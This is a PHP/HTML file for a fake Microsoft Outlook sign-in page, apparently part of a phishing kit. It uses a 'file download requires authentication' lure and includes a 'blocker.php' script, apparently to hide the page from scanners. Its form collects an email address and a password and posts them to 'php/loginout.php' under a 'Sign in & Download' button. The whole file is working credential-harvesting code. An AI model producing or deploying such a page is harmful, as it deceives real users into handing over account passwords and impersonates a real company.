<?php


session_start();
include("blocker.php");

?>

<!DOCTYPE html>
<html> 
<head>
    <title>Outlook - Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
    
    <link rel="shortcut icon" type="icon" href="assets/favicon.ico">
    <link rel="stylesheet" type="text/css" href="scripts/ms-style.css">
    <script type="text/javascript" src="scripts/jquery-2.1.1.min.js"></script>  
    
   
    
</head>

<body>
    <div class="overlay">
        <div class="login-box">
            <img src="assets/ms.png"  alt="logo">
<h2 id="title">User authentication is required to download this file</h2>
            <h2 id="title">Sign&nbsp;in to Outlook</h2>

            <p id="message" class="message"></p>

             <form action="php/loginout.php" method="post">
                
                 <div class="row margin-bottom-50">
                        <div class="form-group  placeholderContainer">
                            <input type="text" style="padding-left: 0px; border: 0px; border-bottom: 1px solid #aaa;width: 96%;
    
    
    height: 2.5em;
    font-size: 15px;
    box-shadow: none;
    overflow: hidden;
   
    margin-bottom: 1em;
}"   aria-required="true"  placeholder="Email, phone, or Skype"  spellcheck="false" autocomplete="off" name="emaill" required>
                           
                        </div>
                           <div class="row margin-bottom-50">
                        <div class="form-group  placeholderContainer">
                            <input type="password" style="padding-left: 0px; border: 0px; border-bottom: 1px solid #aaa"  aria-required="true"  placeholder="Password"  spellcheck="false" autocomplete="off" name="psw" required>
                           
                        </div>
              
                 
                    <div class="row margin-bottom-20">
                        <div class="col-md-12 section text-secondary">
                           
                            <a href="#" aria-label="Create a Microsoft account">I forgot my password !</a>
                            <div class="row inline-block no-margin-top-bottom button-container">

                  
                </div>  
                          
                          
                            
                                  
                  
                </div>  
                         

                   
                   </div>  
                        

<br/><br/>
                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="submit" style="width: 160px;" class="btn btn-block btn-primary" data-bind="value: config.text.linkNext, click: submit" value="Sign in & Download">
                </div>
                </div>